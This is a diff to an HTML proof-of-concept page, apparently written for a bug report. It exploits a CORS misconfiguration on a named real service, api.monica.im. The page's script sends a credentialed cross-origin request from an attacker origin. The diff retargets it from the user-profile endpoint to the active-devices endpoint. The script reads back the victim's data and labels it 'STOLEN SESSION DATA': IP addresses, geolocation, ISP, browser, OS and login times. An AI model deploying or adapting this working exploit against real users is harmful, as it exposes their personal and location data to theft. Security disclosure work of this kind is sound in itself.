@@ -14,52 +14,56 @@
 </head>
 <body>
   <h2>CORS Misconfiguration PoC — api.monica.im</h2>
-  <p>Target: <code>GET https://api.monica.im/api/user/me</code></p>
-  <p>Origin: <code id="origin"></code></p>
-  <div class="status" id="status">Sending cross-origin request...</div>
+  <p>Target: <code>POST https://api.monica.im/api/user/list_active_devices</code></p>
+  <p>Attacker origin: <code id="origin"></code></p>
+  <div class="status" id="status">Sending cross-origin authenticated request...</div>
   <pre id="output">Waiting...</pre>
 
   <script>
     document.getElementById('origin').textContent = window.location.origin;
 
-    fetch('https://api.monica.im/api/user/me', {
-      method: 'GET',
+    fetch('https://api.monica.im/api/user/list_active_devices', {
+      method: 'POST',
       credentials: 'include',
       headers: {
+        'Content-Type': 'application/json',
         'X-Client-Type': 'web',
         'X-Product-Name': 'Monica',
         'X-Client-Locale': 'en'
-      }
+      },
+      body: JSON.stringify({})
     })
-    .then(r => {
-      if (!r.ok && r.status !== 200) throw new Error('HTTP ' + r.status);
-      return r.json();
-    })
+    .then(r => r.json())
     .then(data => {
-      document.getElementById('status').innerHTML =
-        '<span class="ok">✅ CORS BYPASS SUCCESSFUL — victim data read cross-origin</span>';
+      if (!data.data || data.data.length === 0) {
+        document.getElementById('status').innerHTML =
+          '<span class="err">No session / not logged in to Monica</span>';
+        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+        return;
+      }
 
-      const sensitive = {
-        email: data.user?.email,
-        name: data.user?.name,
-        id: data.user?.id,
-        uid: data.user?.uid,
-        country: data.user?.country,
-        auth_platform: data.user?.platform,
-        invite_code: data.user?.invite_code,
-        vip: data.user?.vip_version,
-        created_at: data.user?.created_at
-      };
+      document.getElementById('status').innerHTML =
+        '<span class="ok">✅ CORS BYPASS SUCCESSFUL — victim session data read cross-origin</span>';
+
+      const stolen = data.data.map(d => ({
+        ip: d.client_ip,
+        city: d.geo_info?.city,
+        country: d.geo_info?.country,
+        isp: d.geo_info?.isp,
+        browser: d.browser_name,
+        os: d.os_name,
+        login_at: new Date(d.login_at * 1000).toISOString()
+      }));
 
       document.getElementById('output').textContent =
-        '=== STOLEN USER DATA ===\n\n' +
-        JSON.stringify(sensitive, null, 2) +
+        '=== STOLEN SESSION DATA ===\n\n' +
+        JSON.stringify(stolen, null, 2) +
         '\n\n=== FULL RESPONSE ===\n\n' +
         JSON.stringify(data, null, 2);
     })
     .catch(err => {
       document.getElementById('status').innerHTML =
-        '<span class="err">❌ Request blocked: ' + err.message + '</span>';
+        '<span class="err">❌ Blocked by browser CORS policy: ' + err.message + '</span>';
       document.getElementById('output').textContent = err.toString();
     });
   </script>
